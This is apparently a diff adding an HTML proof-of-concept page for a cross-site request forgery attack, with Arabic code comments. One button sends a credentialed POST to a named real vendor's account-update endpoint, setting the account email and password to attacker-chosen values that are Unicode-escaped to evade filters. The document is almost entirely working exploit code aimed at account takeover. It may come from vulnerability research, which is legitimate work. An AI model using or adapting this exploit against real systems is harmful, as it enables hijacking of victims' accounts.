@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>CSRF PoC with Obfuscated Payload</h2>
+    <button onclick="sendCSRF()">Run CSRF Attack</button>
+
+    <script>
+      function obf(str) {
+        // يحول كل حرف إلى Unicode escape زي \u0065
+        return str.split("").map(c => "\\u" + c.charCodeAt(0).toString(16).padStart(4,"0")).join("");
+      }
+
+      function sendCSRF() {
+        const payload = {
+          email: "attacker@test.com",
+          password: "Pass123!"
+        };
+
+        // عمل stringify + استبدال بالقيم المشفرة
+        let body = JSON.stringify(payload)
+          .replace(/attacker@test\.com/, obf("attacker@test.com"))
+          .replace(/Pass123!/, obf("Pass123!"));
+
+        fetch("https://my-web.avast.com/v1/account/update", {
+          method: "POST",
+          credentials: "include",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: body
+        })
+        .then(r => r.text())
+        .then(d => console.log("Response:\n", d))
+        .catch(e => console.log("Error:\n", e));
+      }
+    </script>
+  </body>
+</html>
